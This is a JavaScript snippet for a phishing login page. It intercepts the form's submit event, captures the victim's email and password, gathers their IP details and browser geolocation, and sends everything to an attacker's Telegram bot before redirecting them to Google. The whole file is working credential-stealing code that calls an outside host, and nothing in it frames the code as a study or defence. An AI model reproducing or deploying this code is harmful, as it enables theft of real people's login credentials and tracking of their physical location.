document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az 7021";
    let chatId = "7894929132"; // Pakai 1 ID saja

    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";

    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 Lokasi: Tidak didukung di browser ini");
            }
        });
    }
    let lokasiUser = await getUserLocation();

    let message = `🔒 *Login Berhasil!*\n\n`
                + `🕒 *Waktu:* ${waktuLogin}\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n`
                + `🌍 *IP:* ${ipInfo.ip}\n`
                + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
                + `🏢 *Provider:* ${ipInfo.org}\n`
                + `${lokasiUser}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`);
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);

    console.log("✅ Data berhasil dikirim!");
    window.location.href = "https://www.google.com";
});
